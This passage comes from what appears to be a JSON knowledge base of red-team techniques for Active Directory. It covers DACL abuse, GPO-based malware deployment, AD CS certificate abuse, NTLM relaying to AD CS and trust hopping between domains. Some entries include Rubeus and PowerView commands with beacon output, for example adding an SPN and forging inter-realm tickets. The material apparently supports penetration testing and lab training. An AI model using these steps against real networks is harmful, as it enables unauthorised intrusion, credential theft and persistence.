flag]]\n2. [[Rubeus#AS-REP Roasting]]\n\n### Add and remove members\n* Add join to `SQL Admins`\n> run net group \"SQL Admins\" john /add /domain\n* Check johns groups\n> run net user john /domain\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[PowerView]]\n[[Change Domain Objects]]\n#### Change DomainObject (SPN)\n\n```powershell\nSet-DomainObject -Identity jonas -Set @{serviceprincipalname=\"fake/NOTHING\"}\n```"
        ],
        "tools": [
            "PowerView"
        ],
        "steps": [
            {
                "id": "c3f7a47f-7191-44a5-b2a1-24b80d73acd1",
                "name": "Check DACL for Accounts",
                "description": "Generate and list the DACL permissions for a specific user account in Active Directory. This identifies if the account has any excessive privileges granted.",
                "requirements": {
                    "Tool": "PowerView",
                    "Access": "Active Directory credentials"
                },
                "results": [
                    "DACL:GENERICALL",
                    "DACL:WRITEDACL"
                ]
            },
            {
                "id": "1c01b3cb-f64d-45d2-9495-fb80a7c28d1b",
                "name": "Modify User Property Permissions",
                "description": "Modify the permissions on a user object to test if write permissions can be granted to another principal, specifically testing for WriteDacl or GenericAll.",
                "requirements": {
                    "Tool": "PowerView",
                    "Access": "Active Directory credentials"
                },
                "results": [
                    "PERM:WRITE",
                    "PERM:GENERICALL"
                ]
            },
            {
                "id": "e1fb96f3-a35d-4051-ba75-f0b1427e63c5",
                "name": "Reset Password of User",
                "description": "Attempt to reset the password of a given user account to see if GenericAll permission is in effect. This can help identify compromised access controls.",
                "requirements": {
                    "Tool": "Net User Command",
                    "Access": "Domain Admin or GenericAll privilege on the user account"
                },
                "results": [
                    "CRED:PASS_RESET",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "72d96416-e1ae-4e02-bf2e-bdb4c27f6c22",
                "name": "Add SPN to User Account",
                "description": "Add a Service Principal Name (SPN) to a user account to test Kerberos service impersonation. This helps analyze the risk of Kerberoasting.",
                "requirements": {
                    "Tool": "PowerView",
                    "Access": "Domain privileges"
                },
                "results": [
                    "SPN:ADDED",
                    "KERB:ROASTABLE"
                ]
            },
            {
                "id": "d1f8ef65-9960-4db6-8535-bb771fb6b7cf",
                "name": "Disable Preauthentication for AS-REP Roasting",
                "description": "Modify the User Account Control settings for an account to prevent preauthentication. This test is to see if accounts are vulnerable to AS-REP roasting attacks.",
                "requirements": {
                    "Tool": "PowerView",
                    "Access": "Domain Admin privileges"
                },
                "results": [
                    "AUTH:NOT_REQUIRED",
                    "ASTYPE:AS_REP_ROAST"
                ]
            }
        ]
    },
    {
        "id": "9ea8347c-cc06-47df-80c1-6a36c2bf8071",
        "name": "Group Policy (GPO)",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "BloodHound",
            "GPRegistryPolicyParser",
            "Remote Server Administration Tools (RSAT)",
            "SharpGPOAbuse"
        ],
        "steps": [
            {
                "id": "07b67d71-e2d1-43fe-95dc-9fc448c16753",
                "name": "Retrieve GPO Report",
                "description": "Use the 'Get-GPOReport' command to generate a report of all Group Policy Objects, which can reveal permissions and settings.",
                "requirements": {
                    "PowerShell": "True"
                },
                "results": [
                    "GPO:REPORT",
                    "GPO:PERMISSIONS"
                ]
            },
            {
                "id": "312b5e0d-e9df-4734-bde1-6c1fa97e1755",
                "name": "Get Effective Group Policy",
                "description": "Use the 'gpresult' command to display the Group Policy settings applied to the current user or computer, which shows effective policies.",
                "requirements": {
                    "Command Prompt": "True"
                },
                "results": [
                    "GPO:EFFECTIVE"
                ]
            },
            {
                "id": "0aeb6750-6b46-42dc-9bfd-3ee3cfe5a7e3",
                "name": "Create New GPO",
                "description": "Use PowerShell to create a new Group Policy Object (GPO) which can then be linked to an Organizational Unit.",
                "requirements": {
                    "PowerShell": "True"
                },
                "results": [
                    "GPO:NEW",
                    "GPO:LINK"
                ]
            },
            {
                "id": "04535353-455e-4c26-ab6d-dd55b0a1c2da",
                "name": "Link GPO to OU",
                "description": "Link an existing Group Policy Object (GPO) to a specific Organizational Unit (OU) using PowerShell to manipulate GPO settings.",
                "requirements": {
                    "PowerShell": "True"
                },
                "results": [
                    "GPO:LINKAGE",
                    "GPO:OU"
                ]
            },
            {
                "id": "91b48e43-1564-4b7f-9c20-ed9bd098c6e0",
                "name": "Modify GPO Settings",
                "description": "Change the settings of an existing Group Policy Object (GPO) to potentially exploit the permissions included in the GPO.",
                "requirements": {
                    "PowerShell": "True"
                },
                "results": [
                    "GPO:MODIFIED"
                ]
            },
            {
                "id": "d12224a3-2d63-4e6c-a2ec-476317d5cae1",
                "name": "Distribute Malware via GPO",
                "description": "Upload a malicious payload to a shared location and set a GPO to execute the payload on target machines during their GPO refresh cycle.",
                "requirements": {
                    "File Sharing": "True"
                },
                "results": [
                    "GPO:MALWARE_DEPLOYED",
                    "GPO:EXECUTION"
                ]
            },
            {
                "id": "5d0681f0-4175-4f60-85d5-b40d2b8f4f19",
                "name": "Add Scheduled Task via GPO",
                "description": "Use 'SharpGPOAbuse' to add a scheduled task to an existing GPO, allowing for specified commands to be executed at user logon or scheduled intervals.",
                "requirements": {
                    "SharpGPOAbuse": "True"
                },
                "results": [
                    "GPO:SCHEDULED_TASK",
                    "GPO:EXECUTION"
                ]
            },
            {
                "id": "8bd969ae-69a0-4d0a-8d50-b695edd8e167",
                "name": "Parse GPO Registry File",
                "description": "Use 'Parse-PolFile' from the GPRegistryPolicyParser to convert the Registry.pol file into a human-readable format, revealing settings specified in a GPO.",
                "requirements": {
                    "GPRegistryPolicyParser": "True"
                },
                "results": [
                    "GPO:REGISTRY_SETTINGS"
                ]
            }
        ]
    },
    {
        "id": "92ea815c-fcbf-48d1-8751-69fb0d9de1cf",
        "name": "WSUS",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "Identify if the Windows Update Service is running via the insecure protocol http",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt",
            "WSuspicious"
        ],
        "steps": [
            {
                "id": "cf39e688-f3d3-41d9-83f5-4fe8b0bb012b",
                "name": "Check WSUS Configuration",
                "description": "Examine the group policy settings to determine if WSUS is configured to use HTTP instead of HTTPS. Look for Registry key: HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU for the value of WUServer.",
                "requirements": {},
                "results": [
                    "WSUS:HTTP",
                    "WSUS:CONFIGURATION"
                ]
            },
            {
                "id": "1448dcb5-6ece-4c7d-b8ec-0f1917af77d2",
                "name": "Validate Windows Update Service",
                "description": "Using PowerShell, check if the Windows Update service is running and inspect its properties for related configuration (e.g., running on HTTP). Use the command: Get-Service wuauserv | Select-Object -Property Status, StartType.",
                "requirements": {
                    "tool": "PowerShell",
                    "access": "Administrative"
                },
                "results": [
                    "WSUS:RUNNING",
                    "WSUS:HTTP"
                ]
            },
            {
                "id": "64bd1a79-58e5-4c57-b78e-76b98ab4f046",
                "name": "Inspect Event Logs for WSUS",
                "description": "Check the Windows Event Logs for any records related to WSUS communication, particularly focusing on logs found at Event Viewer > Applications and Services Logs > Microsoft > Windows > WindowsUpdateClient > Operational. This may provide insights into HTTP usage.",
                "requirements": {
                    "access": "Event Log Viewer"
                },
                "results": [
                    "WSUS:LOGS",
                    "WSUS:HTTP"
                ]
            },
            {
                "id": "451dc99f-9056-46ea-a5a1-c7ab1aa973db",
                "name": "Query WSUS Server URL Settings",
                "description": "Access the Group Policy Management Console and navigate to Computer Configuration > Administrative Templates > Windows Components > Windows Update. Evaluate if 'Specify intranet Microsoft update service location' is set to an HTTP URL, indicating potential misconfigurations.",
                "requirements": {
                    "access": "Group Policy Management Console"
                },
                "results": [
                    "WSUS:HTTP",
                    "GPO:CONFIGURATION"
                ]
            },
            {
                "id": "d1f8d892-f956-4c14-a176-7b35150b50a4",
                "name": "Run Security Assessment with WSuspicious",
                "description": "Utilize the WSuspicious tool to automate the detection of WSUS configurations, especially looking for insecure settings such as HTTP URLs. Analyze the output for findings that indicate insecure WSUS deployments.",
                "requirements": {
                    "tool": "WSuspicious",
                    "access": "Terminal/Command Line"
                },
                "results": [
                    "WSUS:INSECURE",
                    "WSUS:HTTP"
                ]
            }
        ]
    },
    {
        "id": "63d62330-603b-4b4f-9db2-fb66c022b16f",
        "name": "Active Directory Certificate Service",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Active Directory Certificate Service\nActive Directory Certificate Services (AD CS) is a server role that allows you to build a public key infrastructure (PKI). This includes public keys, digital certificates and signatures like (S/MIME), 802.1x, smart card logon, and SSL/TLS.\n\nTo find AD CS Certificate Authorities (CA's) in a domain or forest, run [[Certify]] with the cas parameter. [[Certify#Get certificat details]]\n\nVulnerabilities:\n- [[Misconfigured Certificate Templates]]\n- [[NTLM Relaying to ADCS]]\n\n## Detection\n* AD CS logging is not enabled by default. Logging for the following event can be enabled:\n* `Audit Certification Services` must be enabled via GPO.\n* Event `4886`, \"Certificate Services received a certificate request\".\n* Event `4887` if the request was successful, and a certificate issued.  \nFind requester: Lookup the certificate by `Request ID` and look at the \"Subject Alternative Name\".\n* Event `4768` on the DC if a TGT is requested and will contain the certificate if used.\n\nRead more [here](https://www.specterops.corp/assets/resources/Certified_Pre-Owned.pdf) a blogpost published by [Will Schroeder](https://twitter.com/harmj0y) & [Lee Christensen](https://twitter.com/tifkin_).\n\n## Tools\n########\n########",
        "category": "Active Directory Certificate Service",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "e1f69d77-4b29-4d3c-9b63-3f1187fb57b5",
                "name": "Find Certificate Authorities in Domain",
                "description": "Run Certify with the cas parameter to locate all Certificate Authorities (CAs) present in the Active Directory domain or forest. This helps identify potential misconfigurations or unauthorized CAs.",
                "requirements": {},
                "results": [
                    "CA:LIST"
                ]
            },
            {
                "id": "7920ebc7-56b8-459e-83ae-738574f74116",
                "name": "Enable AD CS Logging",
                "description": "Enable auditing for Certification Services via Group Policy Object (GPO) settings. This step ensures that all events related to certificate requests and related actions are logged for auditing purposes.",
                "requirements": {},
                "results": [
                    "LOG:ADCS_ENABLED"
                ]
            },
            {
                "id": "dd3fbd02-0b58-49d9-a4ec-24b36da8dc67",
                "name": "Monitor Event 4886",
                "description": "Query the event logs for Event ID 4886, which indicates that the Certificate Services received a certificate request. This may require access to the appropriate event logs on the CA server.",
                "requirements": {},
                "results": [
                    "EVENT:4886_FOUND"
                ]
            },
            {
                "id": "c8c7b2f3-2495-4abb-b184-4ad46c9287c5",
                "name": "Monitor Event 4887",
                "description": "Query the event logs for Event ID 4887 to check if the certificate request was successful and a certificate was issued. This helps in tracking the requests processed by CA.",
                "requirements": {},
                "results": [
                    "EVENT:4887_FOUND"
                ]
            },
            {
                "id": "e353b5f1-dbd3-4c7d-927a-aba548be024f",
                "name": "Capture TGT Request Events",
                "description": "Check the Domain Controller logs for Event ID 4768, which involves Ticket Granting Ticket (TGT) requests. This event will contain information regarding certificates used for authentication purposes.",
                "requirements": {},
                "results": [
                    "EVENT:4768_FOUND",
                    "CERTIFICATE:DETAILS"
                ]
            }
        ]
    },
    {
        "id": "7cbd36e5-9a72-4725-b178-a6b89a1ce0d4",
        "name": "Misconfigured Certificate Templates",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "Identifying and exploiting misconfigured Active Directory certificate templates that could allow unauthorized certificate requests.",
        "category": "Active Directory Certificate Service",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Certify"
        ],
        "steps": [
            {
                "id": "e5596da5-868c-4b72-becc-c7c1288e0237",
                "name": "Find Vulnerable Certificate Templates",
                "description": "Identify certificate templates that are misconfigured and allow unauthorized enrollment by domain users. Inspect attributes like 'msPKI-Certificate-Name-Flag' or 'Enrollment Rights'.",
                "requirements": {},
                "results": [
                    "TEMPLATE:VULNERABLE",
                    "TEMPLATE:ENROLLEE_SUPPLIES_SUBJECT",
                    "TEMPLATE:ENROLLMENT_RIGHTS"
                ]
            },
            {
                "id": "a2ff0a8e-5d5b-4e1a-a9e9-0a3a7e5cd1df",
                "name": "Request User Certificate",
                "description": "Make a request for a user certificate from a vulnerable certificate template. This includes specifying the template name and the alternative name (subject).",
                "requirements": {},
                "results": [
                    "CERTIFICATE:ISSUED",
                    "REQUEST:SUCCESS"
                ]
            },
            {
                "id": "110e05e0-09e4-4d6e-82e3-98346a688f6f",
                "name": "Export Certificate to PEM",
                "description": "After the certificate has been issued, export it with the private key to a PEM file named 'cert.pem'. This step involves copying the full base64 encoded certificate and private key.",
                "requirements": {},
                "results": [
                    "CERTIFICATE:SAVED_CLOUD",
                    "FILE:cert.pem"
                ]
            },
            {
                "id": "4bd4b1b0-41f1-4b57-84be-52e1c6883d83",
                "name": "Convert PEM to PFX",
                "description": "Use OpenSSL to convert the 'cert.pem' file to PFX format, outputting to 'cert.pfx'. This will include the private key and certificate.",
                "requirements": {
                    "tool": "OpenSSL"
                },
                "results": [
                    "FILE:cert.pfx",
                    "CONVERSION:SUCCESS"
                ]
            },
            {
                "id": "8bddae5b-751d-4d96-9850-f3b1e1dfee3e",
                "name": "Base64 Encode PFX",
                "description": "Convert the generated PFX certificate file into a base64 encoded string. This is useful for certain applications or for transferring the certificate securely.",
                "requirements": {},
                "results": [
                    "ENCODED:BASE64",
                    "STRING:cert.pfx"
                ]
            }
        ]
    },
    {
        "id": "bd1d373b-7444-468b-bc50-42cda4767d46",
        "name": "NTLM Relaying to ADCS",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "category": "Active Directory Certificate Service",
        "stealthy": false,
        "changes": [
            "\n## [[PrintSpooler]]\n",
            "\n## [[SharpSystemTriggers]]\nMethods available:\n| Method | Description | Img |\n| ------ | ----------- | --- |\n|SharpEfsTrigger| MS-EFS RPC| ![](https://github.com/cube0x0/SharpSystemTriggers/raw/main/Images/efs.png) |\n|SharpSpoolTrigger| MS-RPRN RPC | ![](https://github.com/cube0x0/SharpSystemTriggers/raw/main/Images/spool.png) |\n|SharpDcomTrigger| DCOM Potato | ![](https://github.com/cube0x0/SharpSystemTriggers/raw/main/Images/dcom.png) |"
        ],
        "tools": [
            "MultiRelay",
            "PrintSpooler",
            "SharpSystemTriggers"
        ],
        "steps": [
            {
                "id": "b3cd9f53-2f4a-4f78-a8dc-d1e0a1b8cbcb",
                "name": "Capture incoming traffic on port 445",
                "description": "Use PortBender to capture incoming SMB traffic on port 445 and redirect it to port 8445.",
                "requirements": {},
                "results": [
                    "PORT:445-CAPTURED"
                ]
            },
            {
                "id": "b0d93146-f5c7-47d9-b1e0-5cb61c9b3e76",
                "name": "Setup reverse port forwarding",
                "description": "Start a reverse port forward from port 8445 to port 445 on the Certificate Authority (CA) server.",
                "requirements": {},
                "results": [
                    "PORT:8445-FORWARDING"
                ]
            },
            {
                "id": "eecabbf2-0e1e-4b37-be62-7dd3c0de6d74",
                "name": "Start SOCKS proxy",
                "description": "Initialize a SOCKS proxy on port 1080 to facilitate NTLM traffic relaying.",
                "requirements": {},
                "results": [
                    "SOCKS:1080-STARTED"
                ]
            },
            {
                "id": "1b1fc7e0-41c3-4c2a-a58e-4a9d8970b4b1",
                "name": "Run ntlmrelayx against ADCS",
                "description": "Use ntlmrelayx over the proxy to target the certificate service for certificate requests, specifically targeting the AD CS endpoint.",
                "requirements": {},
                "results": [
                    "NTLMRELAY:SUCCESS",
                    "CERT:REQUESTED"
                ]
            },
            {
                "id": "8f827098-798a-4d43-9a57-362764d2b1ac",
                "name": "Trigger connection from workstation",
                "description": "Execute a payload from WKSTN3 to SRV1 that will initiate the NTLM authentication process.",
                "requirements": {},
                "results": [
                    "CONNECTION:INITIATED",
                    "SMB:REQUEST"
                ]
            },
            {
                "id": "f4743541-90f8-44f6-ac52-6e1bc06f44e0",
                "name": "Confirm connection receipt",
                "description": "Verify the connection logs in PortBender for successful connections from WKSTN3 to SRV1.",
                "requirements": {},
                "results": [
                    "CONNECTION:CONFIRM"
                ]
            },
            {
                "id": "ad84c049-9c0e-438d-8e76-42d4cd1f5f82",
                "name": "Retrieve base64 encoded certificate",
                "description": "Capture and decode the Base64 encoded certificate received after the NTLM relay.",
                "requirements": {},
                "results": [
                    "CERT:BASE64_RECEIVED"
                ]
            },
            {
                "id": "021fedd9-5943-4fbf-a57b-eefefbb94570",
                "name": "Obtain TGS using S4U2self",
                "description": "Use the obtained certificate to request a Ticket Granting Service (TGS) for any service on the machine on behalf of any user.",
                "requirements": {},
                "results": [
                    "TGS:OBTAINED"
                ]
            }
        ]
    },
    {
        "id": "25fc756b-f066-4049-a640-d8edc8389a85",
        "name": "User & Computer Persistence",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "This technique focuses on achieving persistence within Active Directory by utilizing certificates for user and computer authentication.",
        "category": "Active Directory Certificate Service",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Certify"
        ],
        "steps": [
            {
                "id": "fcb2a832-2c53-4f60-9e40-a807ebcc3cdc",
                "name": "Find certificates that permit client authentication",
                "description": "Use Certify to enumerate all certificates that are configured to allow client authentication in the current Active Directory environment.",
                "requirements": {},
                "results": [
                    "CERT:CLIENT_AUTH"
                ]
            },
            {
                "id": "8c59d4ec-5627-4391-93f5-684c30d05c8b",
                "name": "Request a certificate",
                "description": "Request a new certificate for user authentication, ensuring you meet the necessary requirements for the enrollment rights on the CA.",
                "requirements": {},
                "results": [
                    "CERT:REQUEST"
                ]
            },
            {
                "id": "b58c5f24-5d1b-4d59-afc8-f7b216167bdd",
                "name": "Request TGT via certificate",
                "description": "Use Rubeus to request a Ticket Granting Ticket (TGT) for a user by leveraging the requested certificate. This demonstrates the ability to authenticate using the newly obtained certificate.",
                "requirements": {},
                "results": [
                    "TGT:OBTAINED"
                ]
            },
            {
                "id": "2b4e00d2-fade-44e5-8a9d-805805d3b503",
                "name": "Enumerate Computer Certificate Templates",
                "description": "Identify the default certificate template for computer accounts, typically named 'Machine', which may be used to create certificates for computer persistence.",
                "requirements": {},
                "results": [
                    "CERT:TEMPLATE:Machine"
                ]
            }
        ]
    },
    {
        "id": "a710ffb5-b4c0-42c0-b382-2a6ec1617b74",
        "name": "One-Way (Inbound)",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# One-Way (Inbound)\n\nedu.evil.corp has a one-way inbound trust with evil.external.\n```beacon\nbeacon> powershell Get-DomainTrust\n\nSourceName      : edu.evil.corp\nTargetName      : evil.external\nTrustType       : WINDOWS-ACTIVE_DIRECTORY\nTrustAttributes : \nTrustDirection  : Inbound\nWhenCreated     : 3/10/2022 10:13:25 PM\nWhenChanged     : 3/10/2022 10:13:25 PM\n```\n\nInbound means, that principals in our domain can be granted access to resources in the external domain.\n\n## Jump the forest\n\u26a0 In order to access the domain you need to impersonate a user from this domain\n\n### Create inter-realm key\n1. Create TGT for the principal in question\n      ```beacon\n      beacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:jonas /domain:edu.evil.corp /aes256:891[..snip..]7c41 /opsec /nowrap\n\n      [*] Action: Ask TGT\n      [*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n      [*] Using aes256-cts-hmac_sha1 hash: 891[..snip..]7c41\n      [*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\jonas'\n      [+] TGT request successful!\n      [*] base64(ticket.kirbi):\n\n            doIFdD [...snip...] MuSU8=\n      ```\n\n2. Create a referal ticket\n      ```beacon\n      beacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgs /service:krbtgt/evil.external /domain:edu.evil.corp /dc:dc-2.edu.evil.corp /ticket:doIFdD[...snip...]MuSU8= /nowrap\n\n      [*] Action: Ask TGS\n      [*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n      [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket\n      [*] Building TGS-REQ request for: 'krbtgt/evil.external'\n      [+] TGS request successful!\n      [*] base64(ticket.kirbi):\n\n            doIFMT [...snip...] 5BTA==\n      ```\n\n3. Request TGS in target domain with inter-realm TGT\n      ```beacon\n      beacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgs /service:cifs/ad.evil.external /domain:ad.evil.external /dc:ad.evil.external /ticket:doIFMT[...snip...]5BTA== /nowrap\n\n      [*] Action: Ask TGS\n      [*] Using domain controller: ad.evil.external (10.10.14.55)\n      [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket\n      [*] Building TGS-REQ request for: 'cifs/ad.evil.external'\n      [+] TGS request successful!\n      [+] Ticket successfully imported!\n      [*] base64(ticket.kirbi):\n\n            doIFsD [...snip...] JuYWw=\n      ```\n\n4. Store to a file\n      > [System.IO.File]::WriteAllBytes(\"C:\\Users\\Administrator\\Desktop\\external.kirbi\", [System.Convert]::FromBase64String(\"doIFiD [...snip...] 5hbA==\"))\n\n5. [[Use Kerberos ticket (kirbi)]]\n\n## Tools\n########\n########",
        "category": "Forest & Domain Trusts",
        "stealthy": false,
        "changes": [
            "\n## [[PowerView]]\n```powershell\nGet-DomainTrust                     #returns all domain trusts for the current domain or a specified domain\nGet-ForestTrust                     #returns all forest trusts for the current forest or a specified forest\nGet-DomainForeignUser               #enumerates users who are in groups outside of the user's domain\nGet-DomainForeignGroupMember        #enumerates groups with users outside of the group's domain and returns each foreign member\nGet-DomainTrustMapping              #this function enumerates all trusts for the current domain and then enumerates all trusts for each domain it finds\n```\n\n[POWERVIEW - MANUAL](https://powersploit.readthedocs.io/en/latest/Recon/)",
            "\n## [[SharpHound]]\nGet Trust of domain\n>SharpHound -c Trusts -d evil.external"
        ],
        "tools": [
            "PowerView",
            "SharpHound"
        ],
        "steps": [
            {
                "id": "b1af04e7-9781-4c8e-a1b5-7e626aa98c1f",
                "name": "Retrieve Domain Trusts",
                "description": "Execute the Get-DomainTrust command to retrieve all domain trusts in the current Active Directory environment, specifically checking for the trust relationship with evil.external.",
                "requirements": {},
                "results": [
                    "TRUST:evil.external",
                    "TRUST:INBOUND"
                ]
            },
            {
                "id": "ca89e569-aa7d-4263-a3a9-05e761b234d4",
                "name": "Create TGT for User",
                "description": "Generate a Ticket Granting Ticket (TGT) for the user 'jonas' in the 'edu.evil.corp' domain using their AES256 hash, allowing the impersonation of this user.",
                "requirements": {
                    "user": "jonas",
                    "domain": "edu.evil.corp",
                    "aes256_hash": "891[..snip..]7c41"
                },
                "results": [
                    "TGT:successful"
                ]
            },
            {
                "id": "31fe4e63-6605-464b-857d-6f51f43c99dd",
                "name": "Request TGS for External Domain",
                "description": "Request a Service Ticket Granting Service (TGS) for the service 'krbtgt/evil.external' using the previously obtained TGT from the edu.evil.corp domain.",
                "requirements": {
                    "domain_controller": "dc-2.edu.evil.corp",
                    "tgt": "doIFdD[...snip...]MuSU8="
                },
                "results": [
                    "TGS:krbtgt/evil.external",
                    "TICKET:received"
                ]
            },
            {
                "id": "dfc5339d-2ec1-4c50-b40a-9e4032b980ac",
                "name": "Request TGS for CIFS in Target Domain",
                "description": "Using the TGS obtained for the external domain, request a TGS for the CIFS service in the evil.external domain.",
                "requirements": {
                    "domain": "evil.external",
                    "ticket": "doIFMT[...snip...]5BTA=="
                },
                "results": [
                    "TGS:cifs/ad.evil.external",
                    "TICKET:imported"
                ]
            },
            {
                "id": "951b4776-1dc0-4f76-ab84-e35f282b96d3",
                "name": "Store Ticket to File",
                "description": "Write the obtained Kerberos ticket (in .kirbi format) to a file on the local filesystem for later use. The file will be stored at C:\\Users\\Administrator\\Desktop\\external.kirbi.",
                "requirements": {},
                "results": [
                    "FILE:external.kirbi",
                    "TICKET:stored"
                ]
            }
        ]
    },
    {
        "id": "263ba019-a0e0-4591-a36a-1a413372b742",
        "name": "One-Way (Outbound)",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# One-Way (Outbound)\nThis can be a difficult trust to exploit.\nIdea:\n* Domain A trusts Domain B\n* Domain B can access Domain A\n* Domain A can not access Domain B.\n\nTechniques:\n* SQL Server link created in the opposite direction of the domain trust (see [[MS SQL Servers]]).\n* RDP drive sharing (or RDPInception).  \nWhen a user enables drive sharing for their RDP session, it mounts a folder on the target machine that maps back to their local machine. If the target machine is compromised, we may migrate into the user's RDP session and use this mount-point to write files directly onto the machine. This is useful for dropping payloads into their startup folder which would be executed the next time they logon.\n\nWe are here: evil.corp\nTarget: get to evil.external\nOur domain trusts their domain (outbound)\n\nevil.corp has an outbound trust with evil.external.",
        "category": "Forest & Domain Trusts",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "a5b31ae4-bd2a-4c70-8570-b98ccc2bfd92",
                "name": "Check Domain Trusts",
                "description": "Use PowerShell to enumerate the domain trusts and confirm the outbound configuration for the trusted domain.",
                "requirements": {},
                "results": [
                    "TRUST:OUTBOUND",
                    "DOMAIN:evil.external"
                ]
            },
            {
                "id": "d92f4db5-4af7-460e-9b06-818c6ab4a6fa",
                "name": "Enumerate Foreign Security Principals",
                "description": "Identify groups in the current domain that include users from the trusted domain using PowerView.",
                "requirements": {},
                "results": [
                    "FOREIGN:SECURITY_PRINCIPALS",
                    "GROUP:JUMP_USERS"
                ]
            },
            {
                "id": "64a6207d-1937-4bd6-8b62-fc4646f16e12",
                "name": "Identify Lateral Movement Opportunities",
                "description": "Evaluate the permissions of the identified 'Jump Users' to find systems where these users have local admin rights.",
                "requirements": {},
                "results": [
                    "LATERAL:MACHINE_ACCESS",
                    "PERMISSIONS:LOCAL_ADMIN"
                ]
            },
            {
                "id": "ae04e60b-e47f-4cf5-b12b-f957777b013b",
                "name": "Monitor User Activity",
                "description": "Camp on systems with elevated privileges until you see a user from 'Jump Users' authenticate, allowing for impersonation.",
                "requirements": {},
                "results": [
                    "USER:AUTHENTICATED",
                    "IMPERSONATION:READY"
                ]
            },
            {
                "id": "bd09b53b-832c-46de-aed3-49425ea078da",
                "name": "Inject Shell into User Process",
                "description": "Inject a malicious payload into a process running under the Jump Users' context to execute commands as that user.",
                "requirements": {},
                "results": [
                    "PAYLOAD:INJECTED",
                    "USER:DEV\\michael"
                ]
            },
            {
                "id": "0e3bb3a5-6ab6-4e10-b968-40a282d8bfd6",
                "name": "Use WinRM to Execute Commands",
                "description": "Utilize WinRM to remotely execute commands on 'sql01.evil.external' to retrieve user context and host information.",
                "requirements": {},
                "results": [
                    "EXECUTION:REMOTE",
                    "USER:DEV\\michael",
                    "HOST:sql01"
                ]
            },
            {
                "id": "3c6d7565-b86b-4ee7-a493-e3ef63212074",
                "name": "Exploit RDP Drive Sharing",
                "description": "Leverage RDP drive mapping to access the local machine's shared drives from within the compromised RDP session.",
                "requirements": {},
                "results": [
                    "ACCESS:UNC_PATH",
                    "DRIVE:MAPPED"
                ]
            },
            {
                "id": "d79dcf8f-88af-4796-a5e3-dfd55eb5c2f4",
                "name": "Drop Payload in Startup Folder",
                "description": "Upload a payload to the Startup folder using the previously established RDP drive share, ensuring execution on the next login.",
                "requirements": {},
                "results": [
                    "PAYLOAD:DROPPED",
                    "LOCATION:STARTUP_FOLDER"
                ]
            }
        ]
    },
    {
        "id": "173b106f-26bc-486f-bf47-5fe61df5db6d",
        "name": "Parent-Child",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Parent - Child\nWhen a child domain is added to a forest, it automatically creates a transitive, two-way trust with its parent. This be found in the lab where edu.evil.corp is a child domain of evil.corp.\n\n```beacon\nbeacon> powershell Get-DomainTrust\n\nSourceName      : edu.evil.corp\t\t\t//current domain\nTargetName      : evil.corp\t\t\t\t//foreign domain\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST\t\t\t\t//parent/child domain\nTrustDirection  : Bidirectional\t\t\t\t//bidirectional/two-way, One-way trust)\nWhenCreated     : 2/19/2022 1:28:00 PM\nWhenChanged     : 2/19/2022 1:28:00 PM\n```\n\n| Trust type | Transitivity                | Direction          | Description                                                                                                                                    |\n| ---------- | --------------------------- | ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------- |\n| External   | Nontransitive               | One-way or two-way | Provide access to resources that are located on a domain that is located in a separate non joined forest.                                      |\n| Realm      | Transitive or nontransitive | One-way or two-way | Form a trust relationship between a non-Windows Kerberos realm and a Windows Server 2008                                                       |\n| Forest     | Transitive                  | One-way or two-way | Share resources between forests. Two-way trust: authentication requests can reach the other forest.                                            |\n| Shortcut   | Transitive                  | One-way or two-way | Improve user logon times between two domains within a Windows Server forest. This is useful when two domains are separated by two domain trees |\n\nIf we have Domain Admin privileges in the child, we can also gain Domain Admin privileges in the parent using Golden Ticket with a special attribute called SID History.  So when creating a Golden Ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added to the SID history which will grant access to all resources in the parent.\n\nIf edu.evil.corp also had a child (e.g. test.edu.evil.corp), then a DA in TEST would be able to use their krbtgt to hop to DA/EA in evil.corp instantly because the trusts are transitive.\n\nThere are also other means which do not require DA in the child, some of which we've already seen. You can also [[Kerberoasting]] and [[AS-REP Roasting]] across domain trusts, which may lead to privileged credential disclosure. Because principals in EDU can be granted access to resources in EDU, you may find instances where they are accessing machines we have compromised. If they interact with a machine with [[Unconstrained Delegation]], we can capture their TGTs. If they're on a machine interactively, e.g. over RDP, we can impersonate them just like any other user.\n\n## Tools\n########\n########",
        "category": "Forest & Domain Trusts",
